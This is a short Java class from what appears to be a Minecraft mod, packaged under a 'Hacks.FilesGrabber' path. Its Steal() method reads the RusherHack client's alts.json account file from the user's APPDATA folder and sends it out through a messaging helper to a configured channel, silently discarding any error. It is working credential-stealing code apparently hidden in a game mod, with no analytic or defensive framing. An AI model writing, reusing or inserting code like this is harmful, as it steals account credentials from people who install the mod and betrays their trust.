package com.example.examplemod.Hacks.FilesGrabber.Rusher;

import com.example.examplemod.Sender.Cfg;
import com.example.examplemod.Sender.SendMessage;
import java.io.File;

public class Accaunts {
   public static void Steal() throws Exception {
      try {
         SendMessage.sendFile(new File(System.getenv("APPDATA") + "\\.minecraft\\rusherhack\\alts.json"));
         SendMessage.doThing("```RusherAccaunts ^^^```", Cfg.FilesChannel);
      } catch (Exception var1) {
         System.out.println("lol123");
      }

   }
}
